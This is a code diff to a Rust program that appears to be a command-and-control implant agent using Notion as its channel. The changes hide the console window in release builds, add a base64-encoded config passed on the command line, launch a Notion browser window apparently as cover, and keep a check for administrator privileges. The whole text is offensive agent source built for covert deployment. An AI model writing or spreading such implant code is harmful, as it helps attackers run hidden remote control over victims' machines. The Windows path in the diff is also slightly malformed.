@@ -1,14 +1,20 @@
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 extern crate reqwest;
 extern crate tokio;
 extern crate serde_json;
+extern crate whoami;
+extern crate base64;
 
 use std::{thread, time};
-use std::env::{args};
+use std::env::args;
 use std::process::exit;
+use std::process::Command;
 use rand::prelude::*;
 
-use reqwest::{Client};
+use whoami::hostname;
+use reqwest::Client;
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
+use base64::decode;
 
 mod config;
 use config::{
@@ -32,7 +38,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Handle config options
     let mut config_options: ConfigOptions;
 
-    // Check for `-d` option
+    // Check for command line options
+    // -d: debug mode
+    // -c: config file
+    // -b: ingest base64 decode
     match args().nth(1) {
         Some(a) => {
             if a == "-d" {
@@ -45,6 +54,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             } else if a == "-c" {
                 let config_file_path = args().nth(2).unwrap();
                 config_options = load_config_options(Some(config_file_path.as_str())).await?;
+            } else if a == "-b" { 
+                let b64_string = args().nth(2).unwrap().replace(" ", "");
+                let config_string = String::from_utf8(
+                    decode(b64_string.as_str())?
+                )?;
+                config_options = serde_json::from_str(config_string.as_str())?;
             } else {
                 config_options = get_config_options().await?;
             }
@@ -53,12 +68,24 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             config_options = load_config_options(None).await?;
         }
     }
+
+    // Start Notion App if configured to do so
+    if config_options.launch_app {
+        #[cfg(windows)] {
+            Command::new("C\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe")
+            .arg("--app=https://notion.so")
+            .spawn()
+            .expect("Couldn't launch browser!");
+        }
+        #[cfg(not(windows))] {
+            Command::new("/usr/bin/google-chrome")
+            .arg("--app=https://notion.so")
+            .spawn()
+            .expect("Couldn't launch browser!");
+        }
+    }
     
-    let mut hn = hostname::get()
-        .ok()
-        .unwrap()
-        .into_string()
-        .unwrap();
+    let mut hn = hostname();
 
     let is_admin = cmd::getprivs::is_elevated();  
     println!("[*] Admin context: {}", is_admin);
